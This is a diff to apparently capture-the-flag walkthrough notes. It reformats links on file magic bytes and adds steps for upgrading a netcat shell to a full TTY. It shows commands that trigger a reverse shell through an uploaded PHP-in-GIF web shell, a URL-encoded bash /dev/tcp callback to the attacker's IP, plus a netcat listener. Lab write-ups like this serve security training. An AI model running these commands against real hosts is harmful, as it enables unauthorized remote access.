@@ -164,10 +164,10 @@ uploads/127_0_0_1.png
 
 Investigate magic bytes and file types
 
-* https://www.php.net/manual/en/function.finfo-file.php
-* https://en.wikipedia.org/wiki/List_of_file_signatures
-* https://blog.netspi.com/magic-bytes-identifying-common-file-formats-at-a-glance
-* https://medium.com/@d.harish008/what-is-a-magic-byte-and-how-to-exploit-1e286da1c198
+* [PHP finfo_file](https://www.php.net/manual/en/function.finfo-file.php)
+* [List of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)
+* [Magic Bytes - Identifying Common File Formats at a Glance](https://blog.netspi.com/magic-bytes-identifying-common-file-formats-at-a-glance)
+* [What is a Magic Byte and how to exploit](https://medium.com/@d.harish008/what-is-a-magic-byte-and-how-to-exploit-1e286da1c198)
 
 ```bash
 # upload.php: check_file_type($_FILES["myFile"]
@@ -250,4 +250,29 @@ nc -lvnp 4242
 # open reverse shell
 http 10.10.10.146/uploads/10_10_14_14.php.gif?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.14%2F4242%200%3E%261
 http 10.10.10.146/uploads/10_10_14_14.php.gif?cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.14%2F4242+0%3E%261
+```
+
+Upgrade shell
+
+* [Pimp My Shell](https://infosecwriteups.com/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2)
+* [Upgrading Simple Shells to Fully Interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys)
+
+```bash
+# run inside reverse shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+# send in background
+CTRL+Z
+
+# run from host (attacking machine)
+stty raw -echo
+
+# type (not shown)
+fg
+# press enter twice and it will propmt the shell back
+ENTER
+ENTER
+
+# to be able to run "clear"
+export TERM=xterm
 ```
